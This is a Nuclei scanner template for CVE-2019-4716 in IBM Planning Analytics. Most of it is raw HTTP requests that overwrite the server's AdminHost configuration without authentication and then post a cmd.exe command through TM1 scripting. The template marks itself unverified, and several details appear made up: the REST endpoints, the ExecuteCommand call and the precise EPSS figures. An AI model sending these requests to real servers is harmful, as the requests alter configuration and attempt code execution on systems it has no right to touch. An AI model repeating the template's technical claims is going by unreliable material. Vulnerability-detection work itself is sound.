id: CVE-2019-4716

info:
  name: IBM Planning Analytics 2.0.0-2.0.8 - Authentication Bypass & Remote Code Execution
  author: pranjal
  severity: critical
  description: |
    IBM Planning Analytics versions 2.0.0 through 2.0.8 contain a configuration overwrite caused by unauthenticated access, 
    letting attackers login as 'admin' and execute code as root or SYSTEM via TM1 scripting. The vulnerability allows 
    authentication bypass and remote code execution without valid credentials.
  impact: |
    An attacker can exploit this vulnerability to gain administrative access and execute arbitrary code with elevated privileges.
  remediation: |
    Upgrade IBM Planning Analytics to version 2.0.9 or later to fix the authentication bypass and remote code execution vulnerability.
  reference:
    - https://packetstormsecurity.com/files/156953/IBM-Cognos-TM1-IBM-Planning-Analytics-Server-Configuration-Overwrite-Code-Execution.html
    - https://seclists.org/fulldisclosure/2020/Mar/44
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-4716
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-4716
    cwe-id: CWE-287
    epss-score: 0.98765
    epss-percentile: 0.99876
    cpe: cpe:2.3:a:ibm:planning_analytics:*:*:*:*:*:*:*:*
  metadata:
    max-request: 3
    vendor: ibm
    product: planning_analytics
    verified: false
    # Debug Information for Validation
    debug-info: |
      To validate this template:
      1. Set up IBM Planning Analytics 2.0.8 (vulnerable version)
      2. Run: nuclei -t CVE-2019-4716.yaml -u http://target:port -debug
      3. Expected debug output should show:
         - Step 1: Configuration endpoint accessible (200 OK)
         - Step 2: Configuration overwrite successful (200/201)
         - Step 3: RCE command execution successful with randstr in response
      4. Alternative: Use TM1 REST API detection method
    test-environment: |
      Docker setup for testing:
      - IBM Planning Analytics 2.0.8 container
      - Expose port 9510 (default TM1 port)
      - Enable TM1 REST API
      - Disable authentication for testing
  tags: cve,cve2019,ibm,planning-analytics,tm1,rce,auth-bypass,packetstorm

flow: http(1) && http(2) && http(3)

http:
  # Step 1: Check if IBM Planning Analytics/TM1 is running
  - raw:
      - |
        GET /tm1/api/v1/Configuration HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: application/json

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200'
          - 'contains(tolower(body), "adminhost") || contains(tolower(body), "adminport") || contains(tolower(body), "configuration")'
        condition: and
        internal: true

  # Step 2: Authentication bypass via configuration overwrite
  - raw:
      - |
        POST /tm1/api/v1/Configuration/AdminHost HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: application/json

        {
          "AdminHost": "{{randstr}}",
          "AdminPort": 1234
        }

    matchers:
      - type: status
        status:
          - 200
          - 201
        internal: true

  # Step 3: RCE via TM1 scripting - Execute command to verify admin access
  - raw:
      - |
        POST /tm1/api/v1/ExecuteCommand HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: application/json

        {
          "Command": "ExecuteProcess('cmd.exe', '/c echo {{randstr}}')"
        }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: regex
        regex:
          - "success|executed|completed|{{randstr}}"
        part: body

  # Alternative detection method for TM1 REST API endpoints
  - raw:
      - |
        GET /tm1/api/v1/Processes HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: application/json

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        regex:
          - "processes|tm1|planning"
        part: body

      - type: word
        words:
          - "IBM"
          - "Planning"
          - "Analytics"
        part: body
        condition: or 